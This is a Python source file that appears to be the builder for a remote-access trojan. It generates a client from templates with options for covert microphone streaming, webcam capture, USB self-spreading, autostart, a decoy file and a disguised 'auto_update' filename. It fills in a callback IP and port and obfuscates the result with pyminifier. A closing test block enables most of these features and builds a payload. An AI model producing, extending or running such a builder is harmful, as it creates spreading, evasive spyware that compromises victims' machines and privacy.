__author__ = 'Uri Patton'

import client_source
import client_snippets
import subprocess
import pyminifier


class SourceGenerator:

    audio =         False
    webcam =        False
    usb_spreading = False
    autostart =     False
    fake_file =     False
    ip_address =    '127.0.0.1'
    port =          '4434'
    passkey =       '1705a7f91b40320a19db18912b72148e'
    filename =      'auto_update'
    working_dir =   'iDocuments'

    def __init__(self):
        pass

    def generate_source(self):
        self.source = client_source.source
        with open('source.py', 'w') as source:
            source.write(self.format_source(self.source))
        output = subprocess.Popen(["pyminifier", "--obfuscate", "source.py"], stdout=subprocess.PIPE).communicate()[0]
        print output


    def generate_snippets(self):
        return {
            '{%working_directory%}': self.working_dir,
            '{%pyaudioImport%}': 'import pyaudio' if self.audio else "audio_input = 'NoDevice'",
            '{%vidcapImport%}': 'import vidcap' if self.webcam else "web_camera = 'NoDevice'",
            '{%ip_address%}': self.ip_address,
            '{%port_number%}': self.port,
            '{%md5key%}': self.passkey,
            '{%filename%}': self.filename,
            '{%get_webcam_device%}': client_snippets.get_webcam_device if self.webcam else '',
            '{%get_audio_device%}': client_snippets.get_audio_device if self.audio else '',
            '{%initialize_winapi%}': client_snippets.initialize_winapi,
            '{%webcam_shot%}': client_snippets.webcam_shot_function if self.webcam else '',
            '{%audio_streaming_class%}': client_snippets.audio_streaming_class if self.audio else '',
            '{%usb_spreading_class%}': client_snippets.usb_spreading_class if self.usb_spreading else '',
            '{%openFakeFile%}': client_snippets.open_fake_file if self.fake_file else '',
            '{%usbSpreading%}': client_snippets.usb_spreading_on if self.usb_spreading else '',
            '{%elseStatement%}': client_snippets.run_client_if_startup_on if self.autostart else client_snippets.run_client_if_statup_off,
        }

    def use_audio(self, state):
        self.audio = state

    def use_webcam(self, state):
        self.webcam = state

    def use_usb_spreading(self, state):
        self.usb_spreading = state

    def use_autostart(self, state):
        self.autostart = state

    def use_fake_file(self, state):
        self.fake_file = state

    def set_ip_address(self, ip_address):
        self.ip_address = ip_address

    def set_port(self, port):
        self.port = port

    def set_passkey(self, passkey):
        self.passkey = passkey

    def set_file_name(self, file_name):
        self.filename = file_name

    def set_working_dir_name(self, working_dir_name):
        self.working_dir = working_dir_name

    def format_source(self, source):
        snippets = self.generate_snippets()
        return reduce(lambda x, y: x.replace(y, snippets[y]), snippets, source)


# Tests
a = SourceGenerator()
a.use_audio(True)
a.use_autostart(True)
a.use_usb_spreading(True)
a.use_fake_file(True)
a.generate_source()
